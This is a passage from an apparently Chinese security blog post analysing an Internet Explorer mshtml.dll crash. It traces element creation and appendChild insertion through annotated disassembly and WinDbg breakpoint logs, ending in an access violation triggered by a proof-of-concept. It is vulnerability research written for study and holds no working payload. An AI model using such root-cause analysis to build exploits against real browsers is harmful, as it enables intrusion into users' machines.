gs=0000             efl=00000246</span><br><span class="line">mshtml!CreateElement+0x97:</span><br><span class="line">686cd783 ffd2            call    edx &#123;mshtml!CElement::Init2 (686ca047)&#125;</span><br></pre></td></tr></table></figure></p><p>主要功能及注释<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">686</span>CD6FA                 movzx   eax, byte ptr [edi+<span class="number">1</span>] ; eax为索引</span><br><span class="line">.text:<span class="number">686</span>CD6FE                 shl     eax, <span class="number">4</span></span><br><span class="line">.text:<span class="number">686</span>CD701                 add     eax, offset CTagDesc <span class="keyword">const</span> * <span class="keyword">const</span> g_atagdesc ; 函数数组的地址</span><br><span class="line">.text:<span class="number">686</span>CD706                 jz      loc_687E4011</span><br><span class="line">.text:<span class="number">686</span>CD70C                 mov     eax, [eax+<span class="number">8</span>]    ; 得到函数的实际地址</span><br><span class="line">.text:<span class="number">686</span>CD70F                 lea     ecx, [ebp+arg_8]</span><br><span class="line">.text:<span class="number">686</span>CD712                 push    ecx</span><br><span class="line">.text:<span class="number">686</span>CD713                 push    edx</span><br><span class="line">.text:<span class="number">686</span>CD714                 push    edi</span><br><span class="line">.text:<span class="number">686</span>CD715                 call    eax             ; 调用函数</span><br><span class="line">.text:<span class="number">686</span>CD717                 mov     esi, eax</span><br><span class="line">.text:<span class="number">686</span>CD719                 test    esi, esi</span><br><span class="line">.text:<span class="number">686</span>CD71B                 jnz     loc_68665D6C</span><br><span class="line">.text:<span class="number">686</span>CD721                 cmp     [ebx], eax</span><br><span class="line">.text:<span class="number">686</span>CD723                 jnz     loc_68665D67</span><br><span class="line">.text:<span class="number">686</span>CD729                 mov     ecx, [ebp+arg_8] ; 得到上面call eax的结果即元素创建的返回值存到ecx</span><br><span class="line">.text:<span class="number">686</span>CD72C                 mov     edx, [ecx]</span><br><span class="line">.text:<span class="number">686</span>CD72E                 mov     eax, [edx+<span class="number">10</span>h]  ; 取得相应元素虚表偏移<span class="number">0x10</span>处的函数调用</span><br><span class="line">.text:<span class="number">686</span>CD731                 call    eax</span><br><span class="line">.text:<span class="number">686</span>CD733                 mov     esi, eax</span><br><span class="line">.text:<span class="number">686</span>CD735                 test    esi, esi</span><br><span class="line">.text:<span class="number">686</span>CD737                 jnz     loc_68665D6C</span><br><span class="line">.text:<span class="number">686</span>CD73D                 cmp     [ebx], eax</span><br><span class="line">.text:<span class="number">686</span>CD73F                 jnz     loc_68665D67</span><br><span class="line">.text:<span class="number">686</span>CD745                 mov     ecx, [ebp+arg_4] ; <span class="keyword">this</span></span><br><span class="line">.text:<span class="number">686</span>CD748                 mov     edx, [ebp+arg_8]</span><br><span class="line">.text:<span class="number">686</span>CD74B                 push    ecx</span><br><span class="line">.text:<span class="number">686</span>CD74C                 push    edi             ; <span class="class"><span class="keyword">struct</span> <span class="title">CMarkup</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">686</span>CD74D                 push    edx             ; <span class="class"><span class="keyword">struct</span> <span class="title">CHtmTag</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">686</span>CD74E                 call    CElement::InitAttrBag(CHtmTag *,CMarkup *)</span><br><span class="line">.text:<span class="number">686</span>CD753                 mov     esi, eax</span><br><span class="line">.text:<span class="number">686</span>CD755                 test    esi, esi</span><br><span class="line">.text:<span class="number">686</span>CD757                 jnz     loc_68665D6C</span><br><span class="line">.text:<span class="number">686</span>CD75D                 cmp     [ebx], eax</span><br><span class="line">.text:<span class="number">686</span>CD75F                 jnz     loc_68665D67</span><br><span class="line">.text:<span class="number">686</span>CD765                 mov     ecx, [ebp+arg_C]</span><br><span class="line">.text:<span class="number">686</span>CD768                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:<span class="number">686</span>CD76B                 mov     [ebp+var_4], ecx</span><br><span class="line">.text:<span class="number">686</span>CD76E                 mov     ecx, [ebp+arg_8]</span><br><span class="line">.text:<span class="number">686</span>CD771                 mov     [ebp+var_8], eax</span><br><span class="line">.text:<span class="number">686</span>CD774                 mov     [ebp+var_C], edi</span><br><span class="line">.text:<span class="number">686</span>CD777                 mov     edx, [ecx]</span><br><span class="line">.text:<span class="number">686</span>CD779                 mov     edx, [edx+<span class="number">0F</span>8h] ; 取得所创建元素虚表偏移<span class="number">0xf8</span>处的虚函数并在下面调用</span><br><span class="line">.text:<span class="number">686</span>CD77F                 lea     eax, [ebp+var_C]</span><br><span class="line">.text:<span class="number">686</span>CD782                 push    eax</span><br><span class="line">.text:<span class="number">686</span>CD783                 call    edx</span><br></pre></td></tr></table></figure></p><p>下面继续分析创建 <code>span</code> 元素的函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">68648F</span>8C ; <span class="keyword">int</span> __stdcall CSpanElement::CreateElement(struct CHtmTag *, struct CDoc *, struct CElement **)</span><br><span class="line">.text:<span class="number">68648F</span>8C <span class="keyword">public</span>: <span class="keyword">static</span> <span class="keyword">long</span> __stdcall CSpanElement::CreateElement(class CHtmTag *, class CDoc *, class CElement * *) proc near</span><br><span class="line">.text:<span class="number">68648F</span>8C                                         ; DATA XREF: .text:<span class="number">68723</span>ED8↓o</span><br><span class="line">.text:<span class="number">68648F</span>8C</span><br><span class="line">.text:<span class="number">68648F</span>8C arg_4           = dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">68648F</span>8C arg_8           = dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">68648F</span>8C</span><br><span class="line">.text:<span class="number">68648F</span>8C                 mov     edi, edi</span><br><span class="line">.text:<span class="number">68648F</span>8E                 push    ebp</span><br><span class="line">.text:<span class="number">68648F</span>8F                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">68648F</span>91                 push    esi</span><br><span class="line">.text:<span class="number">68648F</span>92                 push    <span class="number">28</span>h             ; dwBytes</span><br><span class="line">.text:<span class="number">68648F</span>94                 push    <span class="number">8</span>               ; dwFlags</span><br><span class="line">.text:<span class="number">68648F</span>96                 push    _g_hProcessHeap ; hHeap</span><br><span class="line">.text:<span class="number">68648F</span>9C                 call    ds:HeapAlloc(x,x,x)</span><br><span class="line">.text:<span class="number">68648F</span>A2                 mov     esi, eax        ; 创建元素后保存在的内存地址</span><br><span class="line">.text:<span class="number">68648F</span>A4                 test    esi, esi</span><br><span class="line">.text:<span class="number">68648F</span>A6                 jz      <span class="keyword">short</span> loc_68648FD2 ; 分配失败直接跳转到函数尾</span><br><span class="line">.text:<span class="number">68648F</span>A8                 push    [ebp+arg_4]     ; 传过来的CDoc对象</span><br><span class="line">.text:<span class="number">68648F</span>AB                 push    <span class="number">5B</span>h</span><br><span class="line">.text:<span class="number">68648F</span>AD                 call    CElement::CElement(ELEMENT_TAG,CDoc *)</span><br><span class="line">.text:<span class="number">68648F</span>B2                 mov     dword ptr [esi], offset <span class="keyword">const</span> CSpanElement::`vftable'</span><br><span class="line">.text:<span class="number">68648F</span>B8                 mov     eax, esi        ; eax = esi = span</span><br><span class="line">.text:<span class="number">68648F</span>BA</span><br><span class="line">.text:<span class="number">68648F</span>BA loc_68648FBA:                           ; CODE XREF: CSpanElement::CreateElement(CHtmTag *,CDoc *,CElement * *)+<span class="number">48</span>↓j</span><br><span class="line">.text:<span class="number">68648F</span>BA                 mov     ecx, [ebp+arg_8]</span><br><span class="line">.text:<span class="number">68648F</span>BD                 mov     [ecx], eax</span><br><span class="line">.text:<span class="number">68648F</span>BF                 neg     eax</span><br><span class="line">.text:<span class="number">68648F</span>C1                 sbb     eax, eax</span><br><span class="line">.text:<span class="number">68648F</span>C3                 <span class="keyword">and</span>     eax, <span class="number">7F</span>F8FFF2h</span><br><span class="line">.text:<span class="number">68648F</span>C8                 add     eax, <span class="number">8007000</span>Eh</span><br><span class="line">.text:<span class="number">68648F</span>CD                 pop     esi</span><br><span class="line">.text:<span class="number">68648F</span>CE                 pop     ebp</span><br><span class="line">.text:<span class="number">68648F</span>CF                 retn    <span class="number">0</span>Ch</span><br></pre></td></tr></table></figure></p><p>可以看到又调用啦 <code>CElement::CElement</code> 函数，现在我们可以做一下总结，当创建一个元素一般经历的步骤是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CDocument::createElement</span><br><span class="line">    |---&gt;CDocument::CreateElementHelper</span><br><span class="line">            |---&gt;CMarkup::CreateElement</span><br><span class="line">                    |---&gt;mshtml!CreateElement</span><br><span class="line">                         |---&gt;CXXXElement::CreateElement</span><br><span class="line">                                  |---&gt;HeapAlloc+CElement::CElement</span><br></pre></td></tr></table></figure></p><p>下面通过在 <code>mshtml!CreateElement + 0x41</code> 和 <code>mshtml!CElement::CElement+0x1e</code> 下断点观测元素创建的过程:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0:013&gt; bu mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4);gc&quot;</span><br><span class="line">0:013&gt; bu mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;</span><br><span class="line">Matched: 682f141a mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Matched: 6832d6de mshtml!CreateElement = &lt;no type information&gt;</span><br><span class="line">Ambiguous symbol error at &apos;mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;&apos;</span><br><span class="line">0:013&gt; bp 6832d6de+0x37 &quot;ln eax;gc&quot;</span><br><span class="line">0:013&gt; bl</span><br><span class="line"> 0 e 68329ff1     0001 (0001)  0:**** mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4);gc&quot;</span><br><span class="line"> 1 e 6832d715     0001 (0001)  0:**** mshtml!CreateElement+0x41 &quot;ln eax;gc&quot;</span><br><span class="line">0:013&gt; g</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">073bafd8  681b5570 00000001 00000008 00000000</span><br><span class="line">073bafe8  00000000 00000000 00000000 00000000</span><br><span class="line">073baff8  00000000 00000000</span><br><span class="line">(682f77d2)   mshtml!CCommentElement::CreateElement   |  (682f7880)   mshtml!`string&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CCommentElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">060d0fc8  681b5570 00000001 00000008 00000000</span><br><span class="line">060d0fd8  00000000 00000000 00000000 00000000</span><br><span class="line">060d0fe8  00000000 00000000</span><br><span class="line">(682f77d2)   mshtml!CCommentElement::CreateElement   |  (682f7880)   mshtml!`string&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CCommentElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">06058fc8  681b5570 00000001 00000008 00000000</span><br><span class="line">06058fd8  00000000 00000000 00000000 00000000</span><br><span class="line">06058fe8  00000000 00000000</span><br><span class="line">(682f1547)   mshtml!CHtmlElement::CreateElement   |  (682f1598)   mshtml!CHtmlElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CHtmlElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">06c46fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">06c46fe8  00000000 00000000 00000000 00000000</span><br><span class="line">06c46ff8  00000000 00000000</span><br><span class="line">(682f181d)   mshtml!CHeadElement::CreateElement   |  (682f1868)   mshtml!CHeadElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CHeadElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07988fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07988fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07988ff8  00000000 00000000</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">072abfd0  681b5570 00000001 00000008 00000000</span><br><span class="line">072abfe0  00000000 00000000 00000000 00000000</span><br><span class="line">072abff0  00000000 00000000</span><br><span class="line">(682f0bba)   mshtml!CBodyElement::CreateElement   |  (682f0c08)   mshtml!CBodyElement::CBodyElement</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CBodyElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">071f2fd0  681b5570 00000001 00000008 00000000</span><br><span class="line">071f2fe0  00000000 00000000 00000000 00000000</span><br><span class="line">071f2ff0  00000000 00000000</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">0795efd0  681b5570 00000001 00000008 00000000</span><br><span class="line">0795efe0  00000000 00000000 00000000 00000000</span><br><span class="line">0795eff0  00000000 00000000</span><br><span class="line">(682f77d2)   mshtml!CCommentElement::CreateElement   |  (682f7880)   mshtml!`string&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CCommentElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">073a8fc8  681b5570 00000001 00000008 00000000</span><br><span class="line">073a8fd8  00000000 00000000 00000000 00000000</span><br><span class="line">073a8fe8  00000000 00000000</span><br><span class="line">(6834f96d)   mshtml!CScriptElement::CreateElement   |  (6834f9b7)   mshtml!CScriptElement::CScriptElement</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CScriptElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07a94f98  681b5570 00000001 00000008 00000000</span><br><span class="line">07a94fa8  00000000 00000000 00000000 00000000</span><br><span class="line">07a94fb8  00000000 00000000</span><br><span class="line">ModLoad: 6c020000 6c0d2000   C:\Windows\System32\jscript.dll</span><br><span class="line">(682a8f8c)   mshtml!CSpanElement::CreateElement   |  (682a8fd8)   mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07ac1fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07ac1fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07ac1ff8  00000000 00000000</span><br><span class="line">(682a8f8c)   mshtml!CSpanElement::CreateElement   |  (682a8fd8)   mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07ae1fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07ae1fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07ae1ff8  00000000 00000000</span><br><span class="line">(682a8f8c)   mshtml!CSpanElement::CreateElement   |  (682a8fd8)   mshtml!CSpanElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07ad7fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">07ad7fe8  00000000 00000000 00000000 00000000</span><br><span class="line">07ad7ff8  00000000 00000000</span><br><span class="line">(682bc4de)   mshtml!CGenericElement::CreateElement   |  (682bc523)   mshtml!CGenericElement::CGenericElement</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CGenericElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">06c81fc8  681b5570 00000001 00000008 00000000</span><br><span class="line">06c81fd8  00000000 00000000 00000000 00000000</span><br><span class="line">06c81fe8  00000000 00000000</span><br><span class="line">(6829a55d)   mshtml!CTable::CreateElement   |  (6829a59e)   mshtml!CTable::CTable</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTable::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">07b82fb8  681b5570 00000001 00000008 00000000</span><br><span class="line">07b82fc8  00000000 00000000 00000000 00000000</span><br><span class="line">07b82fd8  00000000 00000000</span><br><span class="line">(6828d66d)   mshtml!CHRElement::CreateElement   |  (6828d6c3)   mshtml!CHRElement::ApplyDefaultFormat</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CHRElement::CreateElement = &lt;no type information&gt;</span><br><span class="line">&apos;=== CElement ===&apos;</span><br><span class="line">06f65fd8  681b5570 00000001 00000008 00000000</span><br><span class="line">06f65fe8  00000000 00000000 00000000 00000000</span><br><span class="line">06f65ff8  00000000 00000000</span><br><span class="line">(6cc.b80): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=686e9100 ebx=0791dfb0 ecx=06c81fc8 edx=00000000 esi=0469d170 edi=00000000</span><br><span class="line">eip=6836b68d esp=0469d144 ebp=0469d15c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</span><br><span class="line">mshtml!CElement::Doc:</span><br><span class="line">6836b68d 8b01            mov     eax,dword ptr [ecx]  ds:0023:06c81fc8=????????</span><br></pre></td></tr></table></figure></p><p>由上可以观察到创建各元素时调用的函数及元素所在内存的值，偏移0为虚表地址，偏移4为引用计数。<br>下面来看下 <code>poc</code> 里的第二个语句。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.appendChild(f0);</span><br></pre></td></tr></table></figure></p><p><code>windbg</code> 查看包含 <code>appendChild</code> 的符号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; x mshtml!*appendChild*</span><br><span class="line">682c5acf mshtml!CElement::appendChild = &lt;no type information&gt;</span><br><span class="line">68511590 mshtml!CAttribute::appendChild = &lt;no type information&gt;</span><br><span class="line">685109f4 mshtml!CDOMTextNode::appendChild = &lt;no type information&gt;</span><br><span class="line">683fd1d8 mshtml!s_methdescCAttributeappendChild = &lt;no type information&gt;</span><br><span class="line">6837d720 mshtml!s_methdescCElementappendChild = &lt;no type information&gt;</span><br><span class="line">682cd65e mshtml!CDocument::appendChild = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p><p>可以猜到处理函数为 <code>mshtml!CElement::appendChild</code>,可以看到这个函数实际上又调用了 <code>CElement::insertBefore</code> 函数。<br><img src="http://static.zybuluo.com/dane909/jrebckmhnrj4bzpxgaf1op7p/32398244444444.png" alt="32398244444444.png-46.5kB"><br>同上面的创建元素的函数一样，又会调用一个 <code>xxxHelper</code> 的函数，如下图。<br><img src="http://static.zybuluo.com/dane909/0nkfu7fo26y0yzsjhmhs7mb1/QQ%E6%88%AA%E5%9B%BE20180712003955.png" alt="QQ截图20180712003955.png-35.9kB"><br>动态分析对 <code>CElement::InsertBeforeHelper</code> 函数功能进行猜测，注释见下图(很多都是猜的，不确定对不对)。<br><img src="http://static.zybuluo.com/dane909/o2tpwf4umn0q549whs7ustpu/42304982309480329llll.png" alt="42304982309480329llll.png-140.7kB"><br>跟进函数 <code>sub_686659BA</code>,调试信息如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; </span><br><span class="line">eax=0487cfac ebx=05f9ef30 ecx=00000000 edx=00000000 esi=05f1afd0 edi=0766bfd8</span><br><span class="line">eip=686659cb esp=0487cf10 ebp=0487cf90 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CCommentElement::`scalar deleting destructor&apos;+0x18d:</span><br><span class="line">686659cb 8bcf            mov     ecx,edi</span><br><span class="line">0:005&gt; ln poi(edi)</span><br><span class="line">(68648fd8)   mshtml!CSpanElement::`vftable&apos;   |  (685573d8)   mshtml!CBlockElement::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CSpanElement::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=0487cfac ebx=05f9ef30 ecx=0766bfd8 edx=00000000 esi=05f1afd0 edi=0766bfd8</span><br><span class="line">eip=686659cd esp=0487cf10 ebp=0487cf90 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CCommentElement::`scalar deleting destructor&apos;+0x18f:</span><br><span class="line">686659cd e8bb5c0a00      call    mshtml!CElement::Doc (6870b68d)</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=05b8b680 ebx=05f9ef30 ecx=0766bfd8 edx=6870b65d esi=05f1afd0 edi=0766bfd8</span><br><span class="line">eip=686659d2 esp=0487cf10 ebp=0487cf90 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CCommentElement::`scalar deleting destructor&apos;+0x194:</span><br><span class="line">686659d2 8b4f1c          mov     ecx,dword ptr [edi+1Ch] ds:0023:0766bff4=00010000</span><br><span class="line">0:005&gt; ln poi(eax)</span><br><span class="line">(68702028)   mshtml!CDoc::`vftable&apos;   |  (6870fc58)   mshtml!CDoc::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CDoc::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=05b8b680 ebx=05f9ef30 ecx=00010000 edx=6870b65d esi=05f1afd0 edi=0766bfd8</span><br><span class="line">eip=686659d5 esp=0487cf10 ebp=0487cf90 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CCommentElement::`scalar deleting destructor&apos;+0x197:</span><br><span class="line">686659d5 c1e909          shr     ecx,9</span><br></pre></td></tr></table></figure></p><p>通过 <code>mshtml!CElement::Doc</code> 函数获取 <code>CDoc</code>,在这里表示 <code>html</code> 文档，用于下面的插入，继续跟，发现在跳转后又调用了 <code>CDoc::InsertElement</code> 函数。<br><img src="http://static.zybuluo.com/dane909/tcdd0sfbumapox9u7gi5l2oj/QQ%E6%88%AA%E5%9B%BE20180712133222.png" alt="QQ截图20180712133222.png-54.6kB"><br>继续分析， 两次调用 <code>CTreePosGap::MoveTo</code> 函数应该是确定插入的开始和结束位置。之后又调用了 <code>CMarkup::InsertElementInternal</code> 函数。<br><img src="http://static.zybuluo.com/dane909/8s9n2fj1qqc6e05605fakzpw/QQ%E6%88%AA%E5%9B%BE20180712142633.png" alt="QQ截图20180712142633.png-63.2kB"><br>太菜，已经逆到吐，就把函数的功能贴出来吧。<code>CMarkup::InsertElementInternal</code> 函数会在 <code>DOM</code> 树搜索准备插入的分支节点，之后调用 <code>CTreeNode::CTreeNode</code> 构建添加元素的 <code>DOM</code> 节点。<br><img src="http://static.zybuluo.com/dane909/wfluhdmjvhvansghj04yqvmv/QQ%E6%88%AA%E5%9B%BE20180712143816.png" alt="QQ截图20180712143816.png-7.1kB"><br><code>CTreeNode</code> 数据结构大致如下(参考:<a href="https://www.jianshu.com/p/8cd37ffe9a98" target="_blank" rel="noopener">IE DOM 树概览</a>)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    CElement * element;</span><br><span class="line">    